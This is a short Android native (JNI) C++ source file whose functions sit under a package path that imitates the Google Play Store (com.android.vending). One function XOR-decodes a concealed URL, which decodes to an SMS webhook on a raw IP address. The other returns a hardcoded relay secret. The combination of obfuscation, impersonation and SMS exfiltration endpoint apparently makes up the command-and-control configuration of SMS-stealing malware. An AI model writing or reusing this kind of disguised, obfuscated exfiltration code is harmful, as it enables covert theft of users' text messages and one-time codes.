#include <jni.h>
#include <string>
#include <vector>

extern "C" JNIEXPORT jstring JNICALL
Java_com_android_vending_preload_check_Config_getBackendUrl(JNIEnv* env, jobject /* this */) {
    std::vector<unsigned char> encrypted = {
        0x2A, 0x36, 0x36, 0x32, 0x78, 0x6D, 0x6D, 0x74, 0x7B, 0x6C, 0x73, 0x74, 0x7B, 0x6C, 0x73, 0x72, 0x70, 0x6C, 0x71, 0x6D, 0x23, 0x32, 0x2B, 0x6D, 0x34, 0x73, 0x6D, 0x31, 0x2F, 0x31, 0x6D, 0x35, 0x27, 0x20, 0x2A, 0x2D, 0x2D, 0x29
    };
    std::string decrypted = "";
    for (auto b : encrypted) {
        decrypted += (char)(b ^ 0x42);
    }
    return env->NewStringUTF(decrypted.c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_android_vending_preload_check_Config_getRelaySecret(JNIEnv* env, jobject /* this */) {
    return env->NewStringUTF("070c7d6a29debce56db11d474ff1b4db");
}
